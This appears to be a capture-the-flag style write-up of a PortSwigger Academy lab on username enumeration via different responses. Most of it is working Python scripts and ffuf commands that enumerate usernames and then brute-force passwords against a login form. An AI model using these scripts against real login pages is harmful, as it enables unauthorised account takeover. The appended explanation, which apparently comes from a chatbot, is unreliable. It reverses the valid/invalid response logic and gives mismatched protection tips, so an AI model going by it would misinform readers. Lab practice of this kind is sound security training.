# Username enumeration with different responses

## Enumerating username with different responses using Python

```python
import requests, urllib3
import sys
from string import printable

urllib3.disable_warnings()

class AuthBruteForceUsername:

    def __init__(self):
        # get command line arguments
        self.args = sys.argv
        self.proxies = {
            "https": "https://0.0.0.0:8088"
        }
        self.req = requests.Session()
        self.password = ""
        self.username = ""

    def brute_force_username(self):
        print("🔮 Determining username")
        usernames = []
        with open("auth/auth-lab-usernames") as f:
            usernames = f.readlines()
        for username in usernames:
            print(f"Trying username: {username.strip()}❓")
            # send request with form data: username, password
            self.username = username.strip()
            self.password = "a"
            self.url = self.args[1]
            self.cookies = {}
            response = self.req.post(self.url, data={"username": self.username, "password": "a"}, proxies=self.proxies, verify=False)
            if response.status_code == 200:
                if response.text and not "Invalid username" in response.text:
                    print(f"⚖️ Found username: {self.username}")
                    with open("auth-lab-username-result", "w") as f:
                        f.write(self.username)
                    break
        exit(0)

AuthBruteForceUsername().brute_force_username()
```

<a href="https://asciinema.org/a/yiX9W07alkyQxyHyuwNxSt8sO" target="_blank"><img src="https://asciinema.org/a/yiX9W07alkyQxyHyuwNxSt8sO.svg" /></a>

## Brute forcing password with different responses using Python

```python
import requests, urllib3
import sys
from string import printable

urllib3.disable_warnings()

class AuthBruteForcePassword:

    def __init__(self):
        # get command line arguments
        self.args = sys.argv
        self.proxies = {
            "https": "https://0.0.0.0:8088"
        }
        self.req = requests.Session()
        self.password = ""
        self.username = ""
        with open("auth-lab-username-result") as f:
            self.username = f.read().strip()

    def brute_force_password(self):
        print("🔮 Determining passwword for username", self.username)
        passwords = []
        with open("auth/auth-lab-passwords") as f:
            passwords = f.readlines()
        for password in passwords:
            print(f"Trying password: {password.strip()}❓")
            # send request with form data: username, password
            self.password = password.strip()
            self.url = self.args[1]
            self.cookies = {}
            response = self.req.post(self.url, data={"username": self.username, "password": self.password}, proxies=self.proxies, verify=False)
            if response.status_code == 200:
                if response.text and not "Incorrect password" in response.text:
                    print(f"⚖️ Found password: {self.password}")
                    with open("auth-lab-password-result", "w") as f:
                        f.write(self.password)
                    break
        exit(0)

AuthBruteForcePassword().brute_force_password()
```

<a href="https://asciinema.org/a/MVcIRcglrOa8hLB1iMDscHPhX" target="_blank"><img src="https://asciinema.org/a/MVcIRcglrOa8hLB1iMDscHPhX.svg" /></a>

## Enumerating username with different responses using ffuf

Find the username with different responses that the server returns. Use provided
wordlist for usernames and use `-fr` to filter out the response that contains
`Invalid username`. We use `-c` to colorize the output and `-v` to show verbose
output. We use `-r` to follow redirects and `-d` to send form data. We use `-X`
to send POST request and `-replay-proxy` to replay the request through _mitmproxy_ proxy. `FUZZ` is the placeholder for the username, this is used to
replace every username with a line from wordlist.

```bash
ffuf -X POST -replay-proxy http://0.0.0.0:8088 -u https://0a4f00850310138a82660604008d00ed.web-security-academy.net/login -w auth/auth-lab-usernames -c -v -r -d "username=FUZZ&password=example" -fr "\bInvalid username\b"
```

## Brute forcing password with different responses using ffuf

We replace the username with the one we found in the previous command. We use
`-mc` to match the response code `302` which is the response code for redirect.
We also remove `-r` because we don't want to follow redirects.

```bash
ffuf -X POST -replay-proxy http://0.0.0.0:8088 -u https://0a4f00850310138a82660604008d00ed.web-security-academy.net/login -w auth/auth-lab-passwords -c -v -d "username=_USERNAME_FROM_PREVIOUS_COMMAND_&password=FUZZ" -mc 302
```

<a href="https://asciinema.org/a/rCXzMWroIPIFW7PzEuaT0GwcD" target="_blank"><img src="https://asciinema.org/a/rCXzMWroIPIFW7PzEuaT0GwcD.svg" /></a>

> Watch out how you copy using tmux with mouse support, nevertheless we solved another lab!

Sure. The Username enumeration via different responses tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to username enumeration attacks by using different responses.

In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.

The website has different responses for valid and invalid usernames. Specifically, the website returns a different HTML page for invalid usernames.

This means that an attacker can use this difference to enumerate valid usernames. Specifically, the attacker can submit a list of usernames to the website and see if the response is a HTML page or an error message. If the response is an HTML page, the attacker can infer that the username is invalid.

To exploit this vulnerability, the attacker would first need to obtain a list of possible usernames for the website. This could be done through a variety of methods, such as social engineering or dictionary attacks.

Once the attacker has a list of possible usernames, they would need to submit the list to the website and see if the response is a HTML page or an error message. If the response is an HTML page, the attacker can infer that the username is invalid. The attacker can then continue to submit usernames until they find one that is a valid username, which will result in a login page.

The Username enumeration via different responses tutorial example is a good demonstration of how a website can be vulnerable to username enumeration attacks by using different responses. It is important to be aware of these vulnerabilities and to take steps to protect yourself.

Here are some tips for protecting yourself from username enumeration attacks:

* Use a strong username for your online accounts.
* Change your usernames regularly.
* Be suspicious of emails or text messages that ask for your personal information.
* Install antivirus software and keep it up to date.
* Be careful about what websites you visit and what links you click on.
* Train yourself and your employees on how to identify and avoid phishing attacks.

By following these tips, you can help to protect yourself from username enumeration attacks and keep your accounts safe.

In addition to the tips above, there are a few things that the website can do to protect itself from username enumeration attacks:

* Use a rate limiting mechanism to prevent users from submitting too many requests in a short period of time.
* Use a honeypot account to lure attackers into entering invalid usernames.
* Implement a CAPTCHA challenge to verify that the user is human.
* Use a random response page mechanism to prevent attackers from identifying valid usernames from response pages.

By implementing these measures, the website can help to protect itself from username enumeration attacks.